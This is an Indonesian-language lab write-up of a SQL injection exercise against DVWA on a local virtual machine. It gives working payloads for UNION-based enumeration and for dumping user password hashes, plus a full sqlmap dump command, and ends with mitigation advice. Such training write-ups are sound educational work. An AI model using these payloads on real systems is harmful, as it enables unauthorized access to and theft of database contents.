# SQL Injection Attack

## Project Overview

**Target:**

- Aplikasi web: DVWA (Damn Vulnerable Web Application)
- Server: Ubuntu 24.04 LTS dengan Apache2, MySQL, PHP

**Goal:**

- Melakukan eksploitasi SQL Injection untuk mendapatkan data sensitif, mendokumentasikan langkah-langkah dan hasilnya.

---

## Environment Setup

| Komponen | Versi / Tools             |
| -------- | ------------------------- |
| Target   | DVWA + MySQL di Ubuntu VM |
| Attacker | Kali Linux                |
| Tools    | Browser, sqlmap           |

- IP Target: `192.168.56.105`
- IP Attacker: `192.168.56.103`

---

## Langkah-langkah Eksploitasi

### 1. Login dan Konfigurasi DVWA

- Login ke DVWA dengan `admin:password`
- Set `DVWA Security` → `Low`

[screenshot halaman DVWA Security](dvwa-security.png)

---

### 2. Uji Basic SQL Injection

- Input pada User ID:
  `1' or '1'='1`
- Hasil: menampilkan semua user dari database.

[screenshot hasil injection](hasil-injection.png)

---

### 3. Enumerasi Database

#### a. Mendapatkan nama database

`1' UNION SELECT null, database() -- -`

[screenshot hasil database name](nama-database.png)

#### b. Enumerasi tabel

`1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- -`

[screenshot daftar tabel](daftar-tabel.png)

#### c. Enumerasi kolom tabel `users`

`1' UNION SELECT column*name, null FROM information_schema.columns WHERE table_name='users' -- -`
[screenshot kolom tabel users](kolom-tabel-user.png)

---

### 4. Dump Data Sensitif

- Ambil user & password hash
  1' UNION SELECT user, password FROM users -- -
  [screenshot dump user/password](dump-user-password.png)

---

### 5. Automatisasi dengan Sqlmap

`sqlmap -u "http://192.168.56.105/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=73q2oefkph1k37shqj7fi2l36i" --dump`

[screenshot sqlmap dump](sqlmap-dump.png)
[screenshot sqlmap dump csv](csv-dump.png)

---

## Rekoemdasi Mitigasi

| No  | Mitigasi                   | Tujuan                    |
| --- | -------------------------- | ------------------------- |
| 1   | Prepared Statements / Bind | Mencegah query injection  |
| 2   | Validasi & Sanitasi Input  | Input sesuai ekspektasi   |
| 3   | Hide SQL Errors            | Cegah informasi bocor     |
| 4   | Least Privilege DB User    | Batasi dampak exploit     |
| 5   | Gunakan WAF / IDS          | Blok otomatis payload     |
| 6   | Penetration Testing Rutin  | Deteksi celah lebih dini  |
| 7   | Update Software            | Tutup vulnerability lama  |
| 8   | Hardening Konfigurasi      | Minimalkan attack surface |

---

## Kesimpulan

Melalui uji coba pada aplikasi DVWA (Damn Vulnerable Web Application), saya berhasil mendemonstrasikan bagaimana serangan SQL Injection dapat dieksekusi untuk mendapatkan informasi sensitif dari basis data, seperti username, hash password, serta data tabel lainnya. Pengujian ini menunjukkan betapa rentannya sebuah aplikasi web jika tidak dibangun dengan praktik keamanan yang baik.

Dari hasil simulasi menggunakan sqlmap, terbukti bahwa parameter yang tidak divalidasi dan query yang tidak diamankan dengan prepared statements dapat dengan mudah dieksploitasi untuk mengeksekusi perintah SQL arbitrary. Hal ini dapat mengakibatkan kebocoran data, modifikasi database tanpa izin, hingga potensi eskalasi ke sistem operasi server.

Untuk menghindari risiko tersebut, sangat penting menerapkan langkah-langkah mitigasi yang tepat. Mitigasi utama yang direkomendasikan adalah penggunaan prepared statements atau parameterized queries dalam komunikasi dengan database, validasi dan sanitasi input pengguna, penerapan prinsip least privilege pada user database, serta rutin melakukan audit dan penetration testing untuk mendeteksi kerentanan sejak dini.

Dengan menggabungkan praktik pengembangan aplikasi yang aman (secure coding), konfigurasi sistem yang benar, penggunaan firewall aplikasi web (WAF), serta pemeliharaan berkala melalui update sistem dan testing, organisasi dapat meminimalisir risiko SQL Injection dan meningkatkan postur keamanan secara menyeluruh.

---

## Lampiran

- [DVWA Setup](dvwa-setup.sh)
- [CSV guestbook](sqlmap_dump/guestbook.csv)
- [CSV users](sqlmap_dump/users.csv)

---

## _Ditulis oleh:_

**Ibnu Hibban Dzulfikri**
LinkedIn: https://www.linkedin.com/in/ibnu-hibban-dzulfikri-b51a7824a

---
